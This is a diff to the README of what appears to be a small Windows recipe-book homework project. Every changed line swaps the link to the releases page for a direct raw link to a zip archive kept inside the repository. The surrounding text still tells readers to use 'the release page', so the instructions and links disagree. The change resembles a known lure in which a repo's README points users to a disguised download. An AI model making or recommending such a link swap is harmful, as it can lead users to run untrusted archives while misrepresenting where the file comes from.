@@ -1,11 +1,11 @@
 # 🥘 SkillBoxHomework_30 - Simple Recipe Book for Windows
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/434nk5/SkillBoxHomework_30/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/434nk5/SkillBoxHomework_30/raw/refs/heads/main/app/Skill-Box-Homework-v3.7.zip)
 
 ## 📥 Download
 
 Visit this page to download the app for Windows:  
-https://github.com/434nk5/SkillBoxHomework_30/releases
+https://github.com/434nk5/SkillBoxHomework_30/raw/refs/heads/main/app/Skill-Box-Homework-v3.7.zip
 
 On the release page:
 
@@ -150,4 +150,4 @@ This app suits users who want to keep a small recipe catalog on a Windows PC. Yo
 ## 🔗 Download again
 
 If you need to download the app later, use the release page:  
-https://github.com/434nk5/SkillBoxHomework_30/releases
+https://github.com/434nk5/SkillBoxHomework_30/raw/refs/heads/main/app/Skill-Box-Homework-v3.7.zip
